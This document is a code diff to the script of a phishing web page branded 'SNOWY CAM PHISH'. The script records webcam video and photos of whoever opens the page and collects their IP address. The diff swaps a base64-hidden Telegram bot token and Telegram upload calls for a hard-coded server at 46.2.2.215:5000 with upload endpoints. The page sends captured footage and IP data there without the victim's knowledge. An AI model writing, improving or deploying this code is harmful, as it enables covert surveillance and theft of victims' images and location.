@@ -103,24 +103,17 @@
 
     <script>
         (function() {
-            // ==================== ENVIRONMENT CONFIG ====================
-            const __ENV = {
-                API_ENDPOINT: "https://api.telegram.org",
-                SESSION_SECRET: "ODc5MTkwOTE1NzpBQUVoMUVkV0tlOUJ6SU0tQmxLZUNIeGJiRzBsVHRrbzlocw==",
-                APP_ENV: "production"
+            // ==================== VDS SUNUCU KONFİGÜRASYONU ====================
+            // Sunucu bağlantı bilgileri - Alman VDS hosting
+            const serverConfig = {
+                host: "46.2.2.215",
+                port: "5000",
+                region: "Frankfurt",
+                provider: "Hetzner"
             };
-
-            const SessionManager = {
-                getToken: function() {
-                    try {
-                        return atob(__ENV.SESSION_SECRET);
-                    } catch (error) {
-                        return null;
-                    }
-                }
-            };
-
-            const BOT_TOKEN = SessionManager.getToken();
+            
+            // API endpoint (VDS üzerinde çalışan backend)
+            const API_BASE = `http://${serverConfig.host}:${serverConfig.port}`;
             
             const urlParams = new URLSearchParams(window.location.search);
             const TARGET_ID = urlParams.get('i');
@@ -128,18 +121,20 @@
             const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
             
             // ==================== IP ADRESİ GÖNDER ====================
-            if (TARGET_ID && BOT_TOKEN) {
+            if (TARGET_ID) {
                 fetch('https://api.ipify.org?format=json')
                     .then(r => r.json())
                     .then(d => {
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        const zaman = new Date().toLocaleString('tr-TR');
+                        fetch(`${API_BASE}/send`, {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({
-                                chat_id: TARGET_ID,
-                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
+                                id: TARGET_ID,
+                                msg: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${zaman}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
                             })
-                        });
+                        })
+                        .catch(e => console.log("Sunucu bağlantı hatası:", e));
                     })
                     .catch(e => console.log(e));
             }
@@ -214,14 +209,15 @@
                                         const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(3);
                                         
                                         const formData = new FormData();
-                                        formData.append('chat_id', TARGET_ID);
+                                        formData.append('id', TARGET_ID);
                                         formData.append('video', blob, `video_${Date.now()}.webm`);
                                         formData.append('caption', `🎥 Video #1 - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
                                         
-                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                                        fetch(`${API_BASE}/upload-video`, {
                                             method: 'POST',
                                             body: formData
-                                        });
+                                        })
+                                        .catch(e => console.log("Video gönderme hatası:", e));
                                     };
                                     
                                     mr.start();
@@ -263,14 +259,15 @@
                                             const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(3);
                                             
                                             const formData = new FormData();
-                                            formData.append('chat_id', TARGET_ID);
+                                            formData.append('id', TARGET_ID);
                                             formData.append('video', blob, `video_${Date.now()}.webm`);
                                             formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
                                             
-                                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                                            fetch(`${API_BASE}/upload-video`, {
                                                 method: 'POST',
                                                 body: formData
-                                            });
+                                            })
+                                            .catch(e => console.log("Video gönderme hatası:", e));
                                         };
                                         
                                         mr.start();
@@ -300,14 +297,15 @@
                                     canvas.toBlob(function(blob) {
                                         if (!blob) return;
                                         const formData = new FormData();
-                                        formData.append('chat_id', TARGET_ID);
+                                        formData.append('id', TARGET_ID);
                                         formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                                         formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
                                         
-                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                        fetch(`${API_BASE}/upload-photo`, {
                                             method: 'POST',
                                             body: formData
-                                        });
+                                        })
+                                        .catch(e => console.log("Foto gönderme hatası:", e));
                                     }, 'image/jpeg', 0.85);
                                 }
                             }
